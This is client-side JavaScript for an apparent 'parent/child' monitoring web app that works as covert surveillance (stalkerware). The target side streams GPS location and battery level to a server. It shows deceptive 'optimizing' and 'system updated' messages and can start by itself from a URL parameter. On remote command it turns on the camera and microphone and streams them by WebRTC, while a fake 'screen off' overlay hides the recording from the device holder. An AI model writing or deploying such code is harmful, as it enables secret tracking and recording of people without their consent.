const socket = io();
let localStream;
let peerConnection;
let roomId;
let role; // 'parent' or 'child'

const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

// UI Elements
const selection = document.getElementById('role-selection');
const parentDashboard = document.getElementById('parent-dashboard');
const childInterface = document.getElementById('child-interface');
const roomInput = document.getElementById('room-input');
const fakeOff = document.getElementById('fake-off-overlay');

// Event Listeners
document.getElementById('btn-parent').onclick = () => startRole('parent');
document.getElementById('btn-child').onclick = () => startRole('child');
document.getElementById('start-target').onclick = initTargetService;
document.getElementById('exit-parent').onclick = () => location.reload();

// Remote Commands from Parent
document.getElementById('cmd-camera').onclick = () => sendCommand('start-camera');
document.getElementById('cmd-screen').onclick = () => sendCommand('start-screen');

// Check for automatic target mode in URL
window.onload = () => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('target')) {
        startRole('child');
        setTimeout(initTargetService, 1000);
    }
};

function startRole(selectedRole) {
    role = selectedRole;
    // Automatic ID for simplicity (from URL or default)
    const urlParams = new URLSearchParams(window.location.search);
    roomId = urlParams.get('id') || roomInput.value || 'Geral'; 
    selection.classList.add('hidden');
    socket.emit('register', { type: role, roomId });

    if (role === 'parent') {
        parentDashboard.classList.remove('hidden');
    } else {
        childInterface.classList.remove('hidden');
    }
}

// Parent Logic
function sendCommand(command) {
    socket.emit('remote-command', { roomId, command });
}

socket.on('target-status', (data) => {
    const badge = document.getElementById('target-status');
    badge.innerText = data.status.toUpperCase();
    badge.className = `status-badge ${data.status}`;
});

socket.on('target-update', (data) => {
    if (data.location) document.getElementById('data-location').innerText = `${data.location.lat.toFixed(4)}, ${data.location.lng.toFixed(4)}`;
    if (data.battery) document.getElementById('data-battery').innerText = `${Math.round(data.battery * 100)}%`;
    if (data.network) document.getElementById('data-network').innerText = data.network;
});

// Device (Child) Logic
async function initTargetService() {
    document.getElementById('start-target').disabled = true;
    document.getElementById('start-target').innerText = "Otimizando...";

    let permissionsGranted = 0;
    const totalPermissions = 2; // GPS and Camera

    // 1. Start Geolocation Tracking
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(pos => {
            if (permissionsGranted < totalPermissions) permissionsGranted++;
            socket.emit('update-data', {
                location: { lat: pos.coords.latitude, lng: pos.coords.longitude }
            });
            checkPermissionsFinalized();
        }, (err) => {
            console.warn("GPS Error:", err.message);
        }, { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 });
    }

    // 2. Start Battery Tracking
    if (navigator.getBattery) {
        navigator.getBattery().then(batt => {
            const sendBatt = () => socket.emit('update-data', { battery: batt.level });
            batt.onlevelchange = sendBatt;
            sendBatt();
        });
    }

    // 3. Media Permissions (trigger early)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
        stream.getTracks().forEach(track => track.stop()); // Just to get permission
        permissionsGranted++;
        checkPermissionsFinalized();
    } catch (e) {
        console.warn("Media permission denied or not available yet");
    }

    // 4. Wake Lock (Keep Screen On)
    if ('wakeLock' in navigator) {
        navigator.wakeLock.request('screen').catch(() => { });
    }

    function checkPermissionsFinalized() {
        if (permissionsGranted >= totalPermissions) {
            document.getElementById('setup-view').innerHTML = "<h2>Sistema Atualizado</h2><p>O dispositivo está otimizado. Você pode fechar o navegador.</p>";
            setTimeout(() => {
                // Try to close or go to blank
                window.location.href = "about:blank";
            }, 3000);
        }
    }
}

// Handling Remote Commands on Child Device
socket.on('remote-command', async (command) => {
    if (role !== 'child') return;

    if (command === 'start-camera') {
        showFakeOff();
        try {
            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            initiateWebRTC();
        } catch (e) { console.error(e); }
    }
    else if (command === 'start-screen') {
        // Note: Screen sharing ALWAYS prompts user and is often NOT supported on mobile
        if (!navigator.mediaDevices.getDisplayMedia) {
            alert("Este navegador/dispositivo não suporta compartilhamento de tela.");
            return;
        }
        try {
            localStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            initiateWebRTC();
        } catch (e) { console.error(e); }
    }
});

function showFakeOff() {
    fakeOff.classList.remove('hidden');
    // Double tap to exit fake off (secret)
    fakeOff.ondblclick = () => fakeOff.classList.add('hidden');
}

// WebRTC Signaling Logic
async function initiateWebRTC() {
    peerConnection = new RTCPeerConnection(pcConfig);
    localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));

    peerConnection.onicecandidate = (e) => {
        if (e.candidate) socket.emit('signal', { to: roomId, signal: { candidate: e.candidate } });
    };

    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    socket.emit('signal', { to: roomId, signal: { sdp: offer } });
}

socket.on('signal', async (data) => {
    if (!peerConnection) {
        peerConnection = new RTCPeerConnection(pcConfig);
        peerConnection.ontrack = (e) => {
            const video = document.getElementById('remote-video');
            video.srcObject = e.streams[0];
            document.getElementById('video-placeholder').classList.add('hidden');
        };
        peerConnection.onicecandidate = (e) => {
            if (e.candidate) socket.emit('signal', { to: data.from, signal: { candidate: e.candidate } });
        };
    }

    if (data.signal.sdp) {
        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
        if (data.signal.sdp.type === 'offer') {
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('signal', { to: data.from, signal: { sdp: answer } });
        }
    } else if (data.signal.candidate) {
        await peerConnection.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
    }
});
